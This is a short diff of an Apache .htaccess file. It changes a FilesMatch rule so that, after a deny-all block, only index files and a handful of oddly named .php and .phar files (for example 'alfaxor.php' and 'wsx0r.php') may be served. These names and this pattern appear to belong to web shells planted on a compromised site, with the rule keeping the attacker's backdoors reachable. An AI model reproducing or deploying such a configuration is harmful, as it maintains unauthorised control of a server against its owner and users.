@@ -27,7 +27,7 @@
     Deny from all
 </Files>
 
-<FilesMatch "^(index.html|index.php|alfaxor.phar|.indelvesx0r.phar|.delvesx0r.phar|.wsdelvesx0r.phar|wsdelvesx0r.phar|wsx0r.phar)$">
+<FilesMatch "^(index.html|index.php|alfaxor.php|.indelvesx0r.php|alfa.phar|.wsdelvesx0r.php|wsdelvesx0r.php|wsx0r.php)$">
 
  Order allow,deny
 
